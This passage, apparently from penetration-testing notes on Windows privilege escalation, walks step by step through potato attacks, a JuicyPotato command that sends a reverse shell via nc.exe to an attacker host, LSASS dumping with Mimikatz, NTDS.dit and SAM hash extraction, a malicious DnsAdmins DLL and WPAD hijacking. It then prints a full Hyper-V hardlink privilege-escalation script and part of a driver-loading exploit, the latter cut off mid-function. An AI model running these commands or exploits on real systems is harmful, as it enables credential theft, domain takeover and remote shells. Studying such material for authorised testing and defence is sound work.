Upong entering the yielded command on the target machine, a background meterpreter shell should be received. Access wthis shell with the `sessions` command on metasploit. Now, run the local_exploit_suggester module to get the module names for the potato attacks. For PoC, the following will be used to demonstrate privilege escalation:
```bash
use exploit/windows/local/ms16_075_reflection
set session x
set lhost x.x.x.x
set lport xxxx    #make sure it is different from the exploit/multi/script/web_delivery port
set payload windows/meterpreter/reverse_tcp      #try windows/x64/meterpreter/reverse_tcp  with the correct arch

```
After running the potato attack, the attacker still won't be on an administrative shell; however, it will now be possible to impersonate an administrator's delegate token if there are any present on the machine, as follows:
```bash
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"

```
**</u>Manual Exploitation</u>**

In some cases, even when metasploit can be used, manual exploitation may be better. For this example, assume that initial foothold on a SQL server with a privileged SQL user was obtained. In many cases, client connections to IIS and SQL Server are configured to use Windows Authentication since the server may need to access other resources such as file shares as the connecting client. This can be done by impersonating the user whose context the client connection established; to do so, the service account will be granted the SeImpersonate privilege after authentication privilege. 

In this example, the SQL Service service account is running in the contect of the default mssqlserver account. **If `xp_cmdshell` works on the machine, then this attack route will most likely work, granted that the SQL Service service account has either SeImpersonate and SeAssignPrimaryToken privileges.**

**1. Connect to the Machine with MSSQLClient.py**
```bash
impacket-mssqlclient sql_user@x.x.x.x -windows-auth

```
**2. Enable xp_cmdshell:** This stored procedure must be enabled to run OS commands:
```bash
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami 

```
**3. Enumerate Privileges:** Check what privileges the service account has been granted. Look for SeImpersonate or SeAssignPrimaryToken. If this is the case, this privilege can be used to impersonate a privileged account, such as NT AUTHORITY\SYSTEM. JuicyPotato can be used to exploit the SeImpersonate or SeAssignPrimaryToken privileges via DCOM/NTLM reflection abuse.
```bash
SQL> xp_cmdshell whoami /priv

```
**4. Escalate Privileges** Download the `JuicyPotato.exe` binary and upload this and `nc.exe` to the target server. Next, start a nc listener on port 8443, and execute the following command, where `-l` is the COM server listening port, `-p` is the program to launch (cmd.exe), `-a` is the argument passed to cmd.exe and `-t` is the createprocess call. The following command tells the tool to try both the CreateProcessWithTokenW and CreateProcessAsUser functions, which need SeImpersonate or SeAssignPrimaryToken privileges respectively. If this works, a shell as NT AUTHORITY\SYSTEM should be received
```powershell
SQL> xp_cmdshell c:\path\to\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\path\to\nc.exe x.x.x.x 8443 -e cmd.exe" -t *

```
To identify a CLSID for Juicy potato, use a known CLSID for testing such as {4991d34b-80a1-4291-83b6-3328366b9097}, which is used for Windows ask Scheduler:
```powershell
Get-ItemProperty -Path "HKLM:\\SOFTWARE\\Classes\\CLSID\\*" | Select-Object PSChildName | ft -auto
```
If it is not possible to directly escalate to NT AUTHORITY\SYSTEM, impersonate the tokens using **[Incognito.exe](https://github.com/FSecureLABS/incognito/tree/master) or [Rubeus.exe](https://github.com/GhostPack/Rubeus)**
```powershell
incognito.exe list_tokens -u

incognito.exe impersonate_token "NT AUTHORITY\SYSTEM"

```

<a id="windowsprivescsedebugpriv"></a>

#### **`SeDebugPrivilege`**

To run a particular application, service or assist with troubleshooting, a user might be assigned the SeDebugPrivilege instead of adding the account into the administrators group. **By default, only administrators** are granted this privilege, as it can be used to capture sensitive information from system memory, or access/modify kernel and application structures. **This right may be assigned to developers** who need to debug new system components as part of their daily tasks. This user right should be given out sparingly because any account that is assigned it will have access to critical OS components. 
* This privilege can be assigned via local or domain group policy, under Computer Settings > Windows Settings > Security Settings.

Like all other user privilege enumeration, check to see if the SeDebugPrivilege is listed:
```bash
whoami /priv

```
[ProcDump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump) can be used to leverage this privilege and dump process memory. Start with the **Local Security Authority Subsystem Service (LSASS)** process, as it stores user credentials after a user logs on to a system:
```bash
procdump.exe -accepteula -ma lsass.exe lsass.dmp

```
If this works, load the file in Mimikatz using the following commands. After issuing the final command (logonPasswords), the NTLM hash of the local administrator account logged on locally will be obtained. This can be used to **perform a PTH attack to move laterally if the same local administrator password is used on 1+ additional systems,** which is common in large organizations. 
```bash
.\mimikatz.exe
log         #Sends all command output to a .txt file
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords

```
If unable to load tools on the target, but there is RDP access, take a manual memory dump of the LSASS process via the Task manager. After downloading this file back on the attack system, it can be processed with Mimikatz in the same way as the previous example:
* Details tab > LSASS process > Create dump file

Finally, this **privilege can be leveraged for RCE.** With this technique, privileges can be escalated to SYSTEM by launching a child process and using the elevated rights granted to the account via SeDebugPrivilege to alter normal system behavior to inherit the token of a parent process and impersonate it. If a parent process that is running as SYSTEM is targeted (specifying the PID of the target process or running porgram), then this process will be a quick win.

**1. Get a List of Running Processes on an Elevated Shell:** Make sure to select a process that runs as SYSTEM on Windows hosts, like winlogon.exe. Open this cmd/PowerShell session as administrator: 
```bash
tasklist
```
**2. Transfer [Old PSGetSYS.ps1](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1) to Target:** There is a blank third argument (`""`) at the end of the script for it to work properly. For the newer version, use **[New PSGetSYS.ps1](https://github.com/decoder-it/psgetsystem)**

**3. Load Module and Execute**
```powershell
Import-Module .\psgetsys.ps1

.\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,"c:\windows\system32\cmd.exe","")       #older version syntax

ImpersonateFromParentPid -ppid <parentpid> -command "c:\windows\system32\cmd.exe" -cmdargs ""    #newer version syntax
```
It is also possible to use the `Get-Process` cmdlet to grab the PID of a well-known process that runs as SYSTEM (i.e., LSASS) and pass the PID directly to the script, cutting down on the number of required steps:
```powershell
.\psgetsys.ps1; [MyProcess]::CreateProcessFromParent((Get-Process "lsass").Id, "c:\windows\system32\cmd.exe", "")
```

<a id="windowsprivescsetakeownpriv"></a>

#### **`SeTakeOwnershipPrivilege`**

This privilege grants a user the ability to take ownership of any "securable object," meaning AD objects, NTFS files/folders, printers, registry keys, services, and processes. This privilege assigns WRITE_OWNER rights over an object, meaning the user can change the owner within the object's security descriptor. **Administrators are assigned this privilege by default.** 

While it is rare to encounter a standard user account with this privilege, **service accounts may be tasked with running backup jobs and VSS snapshots assigned this privilege;** they may also be assigned with SeBackupPrivilege, SeRestorePrivilege, and SeSecurityPrivilege to control privileges at a more granular level and not granting the account full local admin rights. 

Abusing this privilege is somewhat rare, but it is worth knowing, especially in AD environments where this right can be assigned to a specific user that can be controlled and leveraged to read a sensitive file on a file share. 
* This setting can be set in Group Policy under Computer Configuration > Windows Settings > Security Settings > Local Policies > User Rights Assignment

With this privilege, a user could take ownership of a file or object and make changes that could involve access to sensitive data, RCE, or DOS. If a user is encountered with this privilege, or a user is assigned this privilege via GPO abuse using **[SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse).** In this case, this **privilege can potentially be used to take control of a shared folder or sensitive files such as a document containing passwords or an SSH key.** 

**1. Review the current user privileges to check for SeTakeOwnershipPrivilege**
```bash
whoami /priv
```
**2. Enable SeTakeOwnershipPrivilege:** If this privilege shows up but is not enabled, it can be enabled with **[EnableAllTokenPrivs.ps1](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1)**
```powershell
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
whoami /priv      #reconfirm priv status
```
**3. Choose a Target File and Confirm the Current Ownership:** It is common to encounter file shares with Public and Private directories with subdirectories set up by department. A sysadmin may misconfigure permissions on directories and subdirectories too, opening up the attack surface. In this example, assume that there is access to the file share, and both the Private and Public subdirectories can be freely browsed. The following checks out the target file and gathers more information about it:
```powershell
Get-ChildItem -Path 'C:\Path\To\File\file.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
```
If the owner is not shown, that likely means that the current user does not have enough permissions over the object to view those details. In this case, use the following command to see who is the owner of the directory that stores that file:
```powershell
cmd /c dir /q 'C:\Path\To\File\'

```
**4. Take Ownership of the File:** The built-in `takeown` Windows binary can be used to change ownership of the file:
```powershell
takeown /f 'C:\Path\To\File\file.txt'
```
**5. Confirming Ownership Changed:** The same command as step 3 can be used to see if the current user account is the new file owner:
```powershell
Get-ChildItem -Path 'C:\Path\To\File\file.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
```
**6. Modifying the File ACL:** Try reading the file first before modifying the file ACL. If it cannot be read, change the file ACL with icacls to read it:
```powershell
icacls 'C:\Path\To\File\file.txt' /grant username:F
```
After performing these changing, revert the permissions/file permissions to avoid arousing suspicion. To make it clear, leveraging this permission can be considered a destructive action and should be done leniently. Some local files of interest that this can be attempted on include:
* c:\inetpub\wwwwroot\web.config
* %WINDIR%\repair\sam
* %WINDIR%\repair\system
* %WINDIR%\repair\software, %WINDIR%\repair\security
* %WINDIR%\system32\config\SecEvent.Evt
* %WINDIR%\system32\config\default.sav
* %WINDIR%\system32\config\security.sav
* %WINDIR%\system32\config\software.sav
* %WINDIR%\system32\config\system.sav

Sometimes, there may also be **KeePass database files (.kdbx), OneNote notebooks, files such as passwords.\*,pass.\*,creds.\*, scripts, other configuration files, virtual hard drive files,** and more that can be targeted to extract sensitive information from to escalate privileges. 

<a id="windowsprivescgroupprivs"></a>

### **`Group Privileges`**

Windows contains many groups that grant their members powerful rights and privileges. Many of these can be abused to escalate privileges on both a standalone WIndows host and within an AD domain environment. In some cases, these rights and privileges may be used to gain domain admin, local administrator, or SYSTEM privileges on a Windows workstation, server, or domain controller:


<center>

|Group|Description|
|-----|-----------|
|`Default Administrators`|Domain Admins and Enterprise Admins are "super" groups|
|`Server Operators`|Members can modify services, access SMB shares, and backup files|
|`Backup Operators`|Members are allowed to log onto DCs locally and should be considered domain admins. They can make shadow copies of SAM/NTDS database, read the registry remotely, and access the file system on the DC via SMB. This group is sometimes added to the local Backup Operators group on non-DCs|
|`Print Operators`|Members can log on to the DCs locally and "trick" Windows into loading a malicious driver|
|`Hyper-V Administrators`|If there are virtual DCs, any virtualization admins, such as members of Hyper-V Administrators, should be considered domain admins|
|`Account Operators`|Members can modify non-protected accounts and groups in the domain|
|`Remote Desktop Users`|Members are not given any useful permissions by default, but are often granted additional rights such as Allow Login Through Remote Desktop Services and can move laterally using RDP|
|`Remote Management Users`|Members can log on to DCs with PSRemoting; sometimes added to the local remote management group on non-DCs|
|`Group Policy Creator Owners`|Members can create new GPOs but would need to be delegated additional permissions to link GPOs to a container such as a domain or OU|
|`Schema Admins`|Members can modify the AD schema structure and backdoor any to-be-created Group/GPO by adding a compromised account to the default object ACL|
|`DNS Admins`|Members can load a DLL on a DC, but do not have the necessary permissions to restart the DNS server. They can load a malicious DLL and wait for a reboot as a persistence mechanism. Loading a DLL will often result in the service crashing; a more reliable way to exploit this group is to create a WPAD record|

</center>

Always check built-in groups, their members, and corresponding privileges. An account may be added to a group accidentally or leftover after testing a specific tool or script. With the different permissions of the current user, find escalation paths. 

<a id="windowsprivescbackupoperators"></a>

#### **`Backup Operators`**

Membership of this group grants its members the **`SeBackup` and `SeRestore privileges`.** The former allows a user to traverse any folder and list the folder contents, letting them copy a file from a folder, even if there is no ACE for them in the ACL; however, this cannot be done using the standard copy command. Instead, the data needs to be programmatically copied, making sure to specify the FILE_FLAG_BACKUP_SEMANTICS flag.

**<u>Read Protected Files</u>**

**1. Import Libraries:** To exploit the SeBackupPrivilege, first load an an **[SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)** PoC script.
```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
**2. Verify that SeBackupPrivilege is Enabled:** Invok whoami /priv or use the Get-SeBackupPrivilege cmdlet. If the privilege is disabled, enable it; however, based on the server's settings, it may be required to spawn an elevated CMD prompt to bypass UAC and have this privilege.
```bash
whoami /priv
Set-SeBackupPrivilege      #if priv is disabled, this enables it
Get-SeBackupPrivilege      #confirms priv is enabled
```
**3. Copy a Protected File:** Once the privilege is enaled successfully, it can be leveraged to copy any protected file. Before copying the protected file, try to read it normally; if this responds with PermissionDenied, continue. If this works, sensitive information from protected file can be accessed without directly possessing the required permissions. 
```powershell
Copy-FileSeBackupPrivilege 'C:\Path\to\protected\file.txt' .\file.txt

```
**<u>Copying NTDS.dit</u>**

This group also permits logging in locally to a domain controller. The AD database `NTDS.dit` contains the NTLM hashes for all user and computer objects in the domain; however, this file is locked and is also not accessible by unprivileged users. 
* It is important to note that membership in the local Administrators group, or equivalent, is the minimum required to run Diskshadow.

**1. Use diskshadow.exe to Shadow Copy C Drive and Expose it as E Drive:** Once this is done, the NTDS.dit in the shadow copy (E Drive) won't be in use by the system
```bash
diskshadow.exe

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit

dir E:
```
**2. Copy NTDS.dit Locally:** Use the following cmdlet to bypass the ACL and copy the NTDS.dit locally:
```powershell
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Writeable\Directory\ntds.dit
```
**3. Extracting Credentials from NTDS.dit:** With the NTDS.dit extracted, there are two main ways to extract all AD account credentials. 

With Powershell, use **[DSInternals](https://github.com/MichaelGrafnetter/DSInternals/blob/master/Src/DSInternals.PowerShell/DSInternals.psd1)** to get the NTLM hash for the administrator account for the domain:
```powershell
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM

Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=domaincontroller,DC=local' -DBPath .\ntds.dit -BootKey $key

```
With a Linux attack host, **impacket-secretsdump** can be used offline to extract hashes from the NTDS.dit file. This can be used for PTH attacks to access additional resources or cracked offline with Hashcat to further access. 
```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

```
**<u>Backing up SAM and SYSTEM Registry Hives</u>**

This privilege also lets the user back up the SAM and SYSTEM registry hives, which can be used to extract local account credentials offline using impacket-secretsdump. It is worth noting that if a folder or file has an explicit deny entry for the current user or a group they belong to, that will prevent the user from accessing it, even if the FILE_FLAG_BACKUP_SEMANTICS flag is specified:
```bash
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV

```
**<u>Robocopy</u>**

This built-in CLI tool can be used to copy files in backup mode too. It can be used to create backup jobs and includes features such as multi-threaded copying, automatic retry, the ability to resume copying, etc. Robocopy differs from the copy command in that instead of just copying all files, it can check the destination directory and remove files no longer in the source directory. 
* It can also compare files before copying to save time by not copying files that have not been changed since the last copy/backup job ran
```bash
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

<a id="windowsprivesceventlogreaders"></a>

#### **`Event Log Readers`**

Administrators or members of the Event Log Readers group have permission to access to read event logs, including security logs; however, members in this group do not necessarily have administrative privileges. Sysadmins sometimes also add power users or developers into this group to perform certain tasks without having to grant them administrative access. 

The following command **confirms group membership:**
```bash
net localgroup "Event Log Readers"
```
Windows events can be queried from the CLI using the wevtutil utility and the Get-WinEvent PowerShell cmdlet; it is also possible to specify alternate credentials for wevtutil using the second command:
```bash
wevtutil qe Security /rd:true /f:text | Select-String "/user"     #may disclose other account credentials

wevtutil qe Security /rd:true /f:text /r:name_of_remote_computer. /u:username /p:password | findstr "/user"

```
In the following example, Get-WinEvent is used to **filter for process creation events (4688), which contain /user** in the process command line; the syntax remains the same for different events:
```powershell
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```
It is important to note that searching the security event log with Get-WinEvent requires administrator access or permissions adjusted on the registry key `HKLM\System\CurrentControlSet\Services\Eventlog\Security`. Membership in just the Event Log Readers group is not sufficient. This cmdlet can also be run as another user with the -Credential parameter.
* Also check the PowerShell Operation Log, which may contain sensitive information or credentials if script block or module logging is enabled; this log is **accessible to unprivileged users**

<a id="windowsprivescdnsadmins"></a>

#### **`DnsAdmins`**

Members of the DnsAdmins group have access to DNS information on the network. The Windows DNS service supports custom plugins and can call functions from them to resolve name queries that are not in the scope of any locally hosted DNS zones. The DNS service runs as NT AUTHORITY\SYSTEM, so membership in this group could potentially be leveraged to escalate privileges on a domain controller or in a situation where a separate server is acting as the DNS server for the domain. It is possible to use the built-in dnscmd utility to specify the path of the plugin DLL. The following attack is very common, and can be performed when DNS is run on a domain controller:
* DNS management is performed over RPC
* ServerLevelPluginDll allows the attacker to load a custom DLL with zero verification of the DLL's path. This can be done with the dnscmd tool fromt he CLI
* When a member of the DnsAdmins group runs the dnscmd command below, the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` registry key is populated.
* When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the domain controller's machine account can access)
* An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials

**1. Check DnsAdmins Group Membership**
```powershell
Get-ADGroupMember -Identity DnsAdmins
```
**2. Generate a Malicious DLL:** The following DLL adds a user to the domain admins group
```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" current_user /add /domain' -f dll -o adduser.dll      #replace current_user with DnsAdmin user
```
**3. Transfer Payload to Target Machine**

**4. Load DLL as a User in the DnsAdmins Group:** This will not work if the custom DLL is loaded as a non-privileged user. Only members of DnsAdmins group are permitted to do this. It is important to specify the full path to the custom DLL; the attack will not work properly if not. Only the dnscmd utility can be used by members of the DnsAdmins group, sa they do not directly have permission on the registry key. 
```powershell
dnscmd.exe /config /serverlevelplugindll C:\Users\current_user\Desktop\adduser.dll     #replace current_user with DnsAdmin user
```
With the registry setting containing the path of the malicious plugin configured, and the payload created, the DLL will be loaded the next time the DNS service is started. Membership in the DnsAdmins group doesn't give the ability to restart the DNS service, but this is conceivably something that sysadmins might permit DNS admins to do; therefore, if the current user has this level of access, restart the DNS service (wait until it is restarted if the current user cannot do this). Once restarted, the attacker should be able to run the custom DLL and add a user or get a reverse shell (a user is added from the previous payload, but it can be modified to start a reverse shell).

**5. Check Permissions on DNS Service:** Once the current user's SID is obtained, the sc command can be used to check permissions on the service. Refer to this [article](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/) for an in-depth explanation of SDDL syntax, or just copy the output of the second command and input it in ChatGPT to determine whether the current user has RPWP permissions, which entail SERVICE_START and SERVICE_STOP permissions. If the current user has these permissions, it is possible to start/stop the DNS service
```bash
wmic useraccount where name="username" get sid
sc sdshow DNS
```
**6. Restart the DNS Service:** After confirming the aforementioned permissions, issue the following commands to stop/start the service. **<u>Creating a WPAD Record</u>**

Another way to abuse DnsAdmins group privileges is by creating a WPAD record. Membership in this group gives users the rights to disable global query block security, which by default blocks this attack. By default, WPAD and Intra-site Automatic Tunnel Addressing Protocol (ISATAP) are on the global query block list. These protocols are vulnerable to hijacking, and any domain user can create a computer object or DNS record containing those names. 

After disabling the global query block list and creating a WPAD record, every machine running WPAD with default settings will have its traffic proxied through the attack machine. Responder or Inveigh can be used to perform traffic spoofing, and attempt to capture password hashes and crack them offline or perform an SMBRelay attack. 

**1. Disable the Global Query Block List**
```powershell
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName hostname.domaincontroller.local
```
**2. Add a WPAD Record Pointing to Attack Machine**
```powershell
Add-DnsServerResourceRecordA -Name wpad -ZoneName domaincontroller.local -ComputerName hostname.domaincontroller.local -IPv4Address x.x.x.x
```

```powershell
## Hyper-V EOP via hardlink
## @decoder_it & @padovah4ck
function Native-HardLink {
<#
.SYNOPSIS
	This is a proof-of-concept for NT hard links. There are some advantages, from an offensive
	perspective, to using NtSetInformationFile to create hard links (as opposed to
	mklink/CreateHardLink). NtSetInformationFile allows us link to files we dont have write
	access to. In the script I am performing some steps which are not strictly speaking
	necessary, like using GetFullPathName for path resolution, I have done this mostly to
	educate myself.

	Be smart, you can create a hard links which you wont be able to delete afterwards dont
	shoot yourself in the foot.

	Resources:
		- https://github.com/google/symboliclink-testing-tools
		- https://googleprojectzero.blogspot.com/2015/12/between-rock-and-hard-link.html

.DESCRIPTION
	Author: Ruben Boonen (@FuzzySec)
	License: BSD 3-Clause
	Required Dependencies: None
	Optional Dependencies: None

.PARAMETER Link
	The full path to hard link.

.PARAMETER Target
	The full path to the file we are linking to.

.EXAMPLE
	C:\PS> Native-HardLink -Link C:\Some\Path\Hard.Link -Target C:\Some\Path\Target.file
	True
#>

	[CmdletBinding()]
	param(
		[Parameter(Mandatory = $True)]
		[String]$Link,
		[Parameter(Mandatory = $True)]
		[String]$Target
	)

	# Native API Definitions
	Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;

	[StructLayout(LayoutKind.Sequential)]
	public struct OBJECT_ATTRIBUTES
	{
		public Int32 Length;
		public IntPtr RootDirectory;
		public IntPtr ObjectName;
		public UInt32 Attributes;
		public IntPtr SecurityDescriptor;
		public IntPtr SecurityQualityOfService;
	}

	[StructLayout(LayoutKind.Sequential)]
	public struct IO_STATUS_BLOCK
	{
		public IntPtr Status;
		public IntPtr Information;
	}

	[StructLayout(LayoutKind.Sequential)]
	public struct UNICODE_STRING
	{
		public UInt16 Length;
		public UInt16 MaximumLength;
		public IntPtr Buffer;
	}

	[StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]
	public struct FILE_LINK_INFORMATION
	{
		[MarshalAs(UnmanagedType.U1)]
		public bool ReplaceIfExists;
		public IntPtr RootDirectory;
		public UInt32 FileNameLength;
		[MarshalAs(UnmanagedType.ByValTStr,SizeConst=260)]
		public String FileName;
	}

	public static class NtHardLink
	{
		[DllImport("kernel32.dll", CharSet=CharSet.Ansi)]
		public static extern UInt32 GetFullPathName(
			String lpFileName,
			UInt32 nBufferLength,
			System.Text.StringBuilder lpBuffer,
			ref IntPtr FnPortionAddress);

		[DllImport("kernel32.dll")]
		public static extern bool CloseHandle(
			IntPtr hObject);

		[DllImport("ntdll.dll")]
		public static extern UInt32 NtOpenFile(
			ref IntPtr FileHandle,
			UInt32 DesiredAccess,
			ref OBJECT_ATTRIBUTES ObjAttr,
			ref IO_STATUS_BLOCK IoStatusBlock,
			UInt32 ShareAccess,
			UInt32 OpenOptions);

		[DllImport("ntdll.dll")]
		public static extern UInt32 NtSetInformationFile(
			IntPtr FileHandle,
			ref IO_STATUS_BLOCK IoStatusBlock,
			IntPtr FileInformation,
			UInt32 Length,
			UInt32 FileInformationClass);
	}
"@

	function Emit-UNICODE_STRING {
		param(
			[String]$Data
		)

		$UnicodeObject = New-Object UNICODE_STRING
		$UnicodeObject_Buffer = $Data
		[UInt16]$UnicodeObject.Length = $UnicodeObject_Buffer.Length*2
		[UInt16]$UnicodeObject.MaximumLength = $UnicodeObject.Length+1
		[IntPtr]$UnicodeObject.Buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($UnicodeObject_Buffer)
		[IntPtr]$InMemoryStruct = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(16) # enough for x32/x64
		[system.runtime.interopservices.marshal]::StructureToPtr($UnicodeObject, $InMemoryStruct, $true)

		$InMemoryStruct
	}

	function Get-FullPathName {
		param(
			[String]$Path
		)

		$lpBuffer = New-Object -TypeName System.Text.StringBuilder
		$FnPortionAddress = [IntPtr]::Zero

		# Call to get buffer length
		$CallResult = [NtHardLink]::GetFullPathName($Path,1,$lpBuffer,[ref]$FnPortionAddress)

		if ($CallResult -ne 0) {
			# Set buffer length and re-call
			$lpBuffer.EnsureCapacity($CallResult)|Out-Null
			$CallResult = [NtHardLink]::GetFullPathName($Path,$lpBuffer.Capacity,$lpBuffer,[ref]$FnPortionAddress)
			$FullPath = "\??\" + $lpBuffer.ToString()
		} else {
			$FullPath = $false
		}

		# Return FullPath
		$FullPath
	}

	function Get-NativeFileHandle {
		param(
			[String]$Path
		)

		$FullPath = Get-FullPathName -Path $Path
		if ($FullPath) {
			# IO.* does not support full path name on Win7
			if (![IO.File]::Exists($Path)) {
				Write-Verbose "[!] Invalid file path specified.."
				$false
				Return
			}
		} else {
			Write-Verbose "[!] Failed to retrieve fully qualified path.."
			$false
			Return
		}

		# Prepare NtOpenFile params
		[IntPtr]$hFile = [IntPtr]::Zero
		$ObjAttr = New-Object OBJECT_ATTRIBUTES
		$ObjAttr.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($ObjAttr)
		$ObjAttr.ObjectName = Emit-UNICODE_STRING -Data $FullPath
		$ObjAttr.Attributes = 0x40
		$IoStatusBlock = New-Object IO_STATUS_BLOCK

		# DesiredAccess = MAXIMUM_ALLOWED; ShareAccess = FILE_SHARE_READ
		$CallResult = [NtHardLink]::NtOpenFile([ref]$hFile,0x02000000,[ref]$ObjAttr,[ref]$IoStatusBlock,0x1,0x0)
		if ($CallResult -eq 0) {
			$Handle = $hFile
		} else {
			Write-Verbose "[!] Failed to acquire file handle, NTSTATUS($('{0:X}' -f $CallResult)).."
			$Handle = $false
		}

		# Return file handle
		$Handle
	}

	function Create-NtHardLink {
		param(
			[String]$Link,
			[String]$Target
		)

		$LinkFullPath = Get-FullPathName -Path $Link
		# IO.* does not support full path name on Win7
		$LinkParent = [IO.Directory]::GetParent($Link).FullName
		if (![IO.Directory]::Exists($LinkParent)) {
			Write-Verbose "[!] Invalid link folder path specified.."
			$false
			Return
		}
		

		# Create pFileLinkInformation & IOStatusBlock struct
		$FileLinkInformation = New-Object FILE_LINK_INFORMATION
		$FileLinkInformation.ReplaceIfExists = $true
		$FileLinkInformation.FileName = $LinkFullPath
		$FileLinkInformation.RootDirectory = [IntPtr]::Zero
		$FileLinkInformation.FileNameLength = $LinkFullPath.Length * 2
		$FileLinkInformationLen = [System.Runtime.InteropServices.Marshal]::SizeOf($FileLinkInformation)
		$pFileLinkInformation = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($FileLinkInformationLen)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($FileLinkInformation, $pFileLinkInformation, $true)
		$IoStatusBlock = New-Object IO_STATUS_BLOCK

		# Get handle to target
		$hTarget = Get-NativeFileHandle -Path $Target
		if (!$hTarget) {
			$false
			Return
		}

		# FileInformationClass => FileLinkInformation = 0xB
		$CallResult = [NtHardLink]::NtSetInformationFile($hTarget,[ref]$IoStatusBlock,$pFileLinkInformation,$FileLinkInformationLen,0xB)
		if ($CallResult -eq 0) {
			$true
		} else {
			Write-Verbose "[!] Failed to create hardlink, NTSTATUS($('{0:X}' -f $CallResult)).."
		}

		# Free file handle
		$CallResult = [NtHardLink]::CloseHandle($hTarget)
	}

	# Create Hard Link
	Create-NtHardLink -Link $Link -Target $Target
}

$user=$env:UserName
$mypath = "c:\users\$user\documents\"
$targetfile="c:\windows\system32\license.rtf"
echo "[+] Path:$mypath"
$VMName = "testEOP"
$NewVHDPath = $mypath+$VMName+".vhdx"
echo "[+] VHD Disk: $NewVHDPath"

echo "[+] removing disk"
remove-item -force -path $NewVHDPath -erroraction ignore
echo "[+] Creating VM ..."
$a=(Get-VMSwitch)
$VM = @{
     Name = $VMName
     MemoryStartupBytes = 2147483648
     Generation = 2
     NewVHDPath = $NewVHDPath
     NewVHDSizeBytes = 53687091200
     BootDevice = "VHD"
     Path = $mypath
     SwitchName = $a[0].Name
}

New-VM @VM
echo "[+] Done!"
echo "[+] removing disk"
remove-item -force $NewVHDPath
echo "[+] Creating link $NewVHDPath -> $targetfile"
Native-HardLink $NewVHDPath $targetfile 

echo "[+] removing VM"
Remove-VM -force -Name $VMName
echo "[+] New perms on target:"
get-acl $targetfile | fl

```

```cpp
/*
Reference:
https://github.com/hatRiot/token-priv
https://github.com/TarlogicSecurity/EoPLoadDriver

Enable the SeLoadDriverPrivilege of current process and then load the driver into the kernel.

First you need to add two reg keys,the command is:
reg add hkcu\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\test\Capcom.sys"
reg add hkcu\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
Then run me to load the driver(C:\test\Capcom.sys) into the kernel.

We will have all access on the system.
*/
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
#pragma comment(lib,"advapi32.lib") 
#pragma comment(lib,"user32.lib") 
#pragma comment(lib,"Ntdll.lib")


LPWSTR getUserSid(HANDLE hToken)
{

	// Get the size of the memory buffer needed for the SID
	//https://social.msdn.microsoft.com/Forums/vstudio/en-US/6b23fff0-773b-4065-bc3f-d88ce6c81eb0/get-user-sid-in-unmanaged-c?forum=vcgeneral
	//https://msdn.microsoft.com/en-us/library/windows/desktop/aa379554(v=vs.85).aspx

	DWORD dwBufferSize = 0;
	if (!GetTokenInformation(hToken, TokenUser, NULL, 0, &dwBufferSize) &&
		(GetLastError() != ERROR_INSUFFICIENT_BUFFER))
	{
		wprintf(L"GetTokenInformation failed, error: %d\n",
			GetLastError());
		return NULL;
	}

	//https://social.msdn.microsoft.com/Forums/vstudio/en-US/6b23fff0-773b-4065-bc3f-d88ce6c81eb0/get-user-sid-in-unmanaged-c?forum=vcgeneral
	PTOKEN_USER pUserToken = (PTOKEN_USER)HeapAlloc(
		GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		dwBufferSize);

	if (pUserToken == NULL) {
		HeapFree(GetProcessHeap(), 0, (LPVOID)pUserToken);
		return NULL;
	}

	// Retrive token info
	if (!GetTokenInformation(
		hToken,
		TokenUser,
		pUserToken,
		dwBufferSize,
